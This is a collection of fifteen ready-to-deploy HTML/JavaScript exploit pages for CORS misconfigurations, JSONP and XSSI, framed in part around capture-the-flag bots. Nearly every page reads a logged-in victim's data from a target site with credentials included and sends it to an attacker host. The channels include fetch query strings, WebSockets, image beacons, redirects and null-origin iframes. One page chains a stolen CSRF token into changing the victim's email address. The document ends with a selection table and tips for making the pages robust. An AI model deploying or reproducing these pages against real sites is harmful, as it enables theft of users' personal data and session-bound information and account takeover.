# PoC collection — complete working exploit pages for every shape

Ready-to-deploy pages — each a full HTML file you host or encode,
matched to the CORS shape it exploits.

---

## PoC 1 — the canonical reflected read

```html
<!doctype html>
<html><body><script>
// for: ACAO reflected + ACAC:true + SameSite=None cookie
var T='https://TARGET/api/me', A='https://ATTACKER/';
fetch(T,{credentials:'include'})
 .then(r=>{ if(!r.ok) throw 'status '+r.status; return r.json(); })
 .then(d=>{ fetch(A+'?d='+btoa(JSON.stringify(d)))
            .then(()=>{document.body.innerText='sent'}); })
 .catch(e=>{ document.body.innerText='ERR '+e;
             fetch(A+'?err='+encodeURIComponent(e)); });
</script></body></html>
```

## PoC 2 — the DOM-scrape — flag in an HTML page

```html
<!doctype html>
<html><body><script>
// for: a flag rendered in an HTML page (not a JSON API)
var T='https://TARGET/admin/flag', A='https://ATTACKER/';
fetch(T,{credentials:'include'})
 .then(r=>r.text())
 .then(h=>{
   var m=h.match(/[A-Z]+\{[^}]+\}/);
   var out = m ? m[0] : h.slice(0,500);
   fetch(A+'?f='+encodeURIComponent(out));
 })
 .catch(e=>fetch(A+'?err='+encodeURIComponent(e)));
</script></body></html>
```

## PoC 3 — the token-read → CSRF-write chain

```html
<!doctype html>
<html><body><script>
// for: a CORS-open token endpoint + a CSRF-vulnerable write
var BASE='https://TARGET', A='https://ATTACKER/';
fetch(BASE+'/api/csrf',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch(BASE+'/api/email',{
   method:'POST',credentials:'include',
   headers:{'Content-Type':'application/json'},
   body:JSON.stringify({email:'attacker@x.com',csrf_token:t.token})}))
 .then(r=>fetch(A+'?done='+r.status))
 .catch(e=>fetch(A+'?err='+encodeURIComponent(e)));
</script></body></html>
```

## PoC 4 — the null-origin data: URL — airgapped bot

```text
data:text/html,<script>fetch('http://127.0.0.1/api/flag',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://ATTACKER/?d='+encodeURIComponent(d))).catch(e=>fetch('https://ATTACKER/?e='+e))</script>
```

The bot opens this URL directly — its fetch originates 'null' —
needs a null-allowed CORS. the 127.0.0.1 target is the bot's own
network position.

## PoC 5 — the sandboxed-iframe read — a null origin on a real page

```html
<!doctype html>
<html><body>
<iframe sandbox="allow-scripts" src="data:text/html,
  <script>
    fetch('https://TARGET/api/flag',{credentials:'include'})
     .then(r=>r.text())
     .then(d=>parent.postMessage(d,'*'));
  <\/script>">
</iframe>
<script>
window.addEventListener('message',e=>{
  fetch('https://ATTACKER/?d='+encodeURIComponent(e.data));
});
</script>
</body></html>
```

## PoC 6 — the subdomain-trust read — a `*.target.com` page

```html
<!-- hosted on sub.target.com — a subdomain XSS, takeover, or CTF sub -->
<!doctype html>
<html><body><script>
var T='https://TARGET/api/me', A='https://ATTACKER/';
fetch(T,{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch(A+'?d='+btoa(JSON.stringify(d))))
</script></body></html>
```

## PoC 7 — the JSONP read — a script-tag channel

```html
<!doctype html>
<html><body>
<script>
function leak(d){ fetch('https://ATTACKER/?d='+encodeURIComponent(JSON.stringify(d))) }
</script>
<script src="https://TARGET/api/me?callback=leak"></script>
</body></html>
```

## PoC 8 — the write-back exfil — no external listener

```html
<!doctype html>
<html><body><script>
// the flag lands in a comment you read same-origin
var T='https://TARGET', A='https://ATTACKER/';
fetch(T+'/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch(T+'/api/comment',{
   method:'POST',credentials:'include',
   headers:{'Content-Type':'application/json'},
   body:JSON.stringify({body:'exfil:'+d.flag})}))
 .then(()=>fetch(A+'?wb=1'))
</script></body></html>
```

## PoC 9 — the DOM-writeback — a screenshotting bot

```html
<!doctype html>
<html><body><pre id=out>loading...</pre><script>
fetch('https://TARGET/api/flag',{credentials:'include'})
 .then(r=>r.text())
 .then(d=>{document.getElementById('out').innerText='FLAG: '+d})
</script></body></html>
```

## PoC 10 — the multi-read chain — token → flag

```html
<!doctype html>
<html><body><script>
var T='https://TARGET', A='https://ATTACKER/';
fetch(T+'/api/token',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch(T+'/api/flag?key='+t.key,{credentials:'include'}))
 .then(r=>r.text())
 .then(d=>fetch(A+'?d='+encodeURIComponent(d)))
 .catch(e=>fetch(A+'?err='+encodeURIComponent(e)))
</script></body></html>
```

## PoC 11 — the redirect-exfil — flag in the URL

```html
<!doctype html>
<html><body><script>
fetch('https://TARGET/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>{location='https://ATTACKER/?f='+encodeURIComponent(d.flag)})
</script></body></html>
```

## PoC 12 — the ws-exfil — a persistent channel

```html
<!doctype html>
<html><body><script>
var w=new WebSocket('wss://ATTACKER/x');
w.onopen=function(){
  fetch('https://TARGET/api/me',{credentials:'include'})
   .then(r=>r.json())
   .then(d=>{w.send(JSON.stringify(d)); w.close();})
};
</script></body></html>
```

## PoC 13 — the img-exfil — a no-CORS channel

```html
<!doctype html>
<html><body><script>
fetch('https://TARGET/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>{var i=new Image(); i.src='https://ATTACKER/x?d='+btoa(JSON.stringify(d))})
</script></body></html>
```

## PoC 14 — the retry-and-persist — a flaky bot

```html
<!doctype html>
<html><body><script>
async function go(){
  for(var i=0;i<3;i++){
    try{
      var r=await fetch('https://TARGET/api/me',{credentials:'include'});
      var d=await r.json();
      await fetch('https://ATTACKER/?d='+btoa(JSON.stringify(d))+'&try='+i);
      break;
    }catch(e){ /* retry */ }
  }
}
go();
</script></body></html>
```

## PoC 15 — the XSSI global-setter read

```html
<!doctype html>
<html><body>
<script>
// the endpoint sets a global — capture it before it loads
var leaked;
Object.defineProperty(window,'SECRET',{configurable:true,
  set:function(v){leaked=v; fetch('https://ATTACKER/?d='+encodeURIComponent(v));}});
</script>
<script src="https://TARGET/api/x.js"></script>
</body></html>
```

## The PoC-selection table — which page for which shape

```text
reflected API + JSON data       → PoC 1
reflected + HTML page           → PoC 2 DOM-scrape
token endpoint + write          → PoC 3 chain
null-allowed + airgapped bot    → PoC 4 data: URL
null-allowed + real page        → PoC 5 sandboxed iframe
subdomain-trust + a controlled sub → PoC 6
a JSONP endpoint                → PoC 7
no external exfil               → PoC 8 write-back / PoC 9 DOM
a token→flag chain              → PoC 10
a flaky bot                     → PoC 14 retry
a JS-served endpoint            → PoC 15 XSSI
```

## The PoC-hardening — making the page robust

```js
// always add the catch — an unfired exfil is a silent failure
.catch(e=>fetch(A+'?err='+encodeURIComponent(e)))
// always attribute the read — a marker in the exfil
'&src=cors-poc-1'
// always bound the retry — a runaway fetch floods the target
```
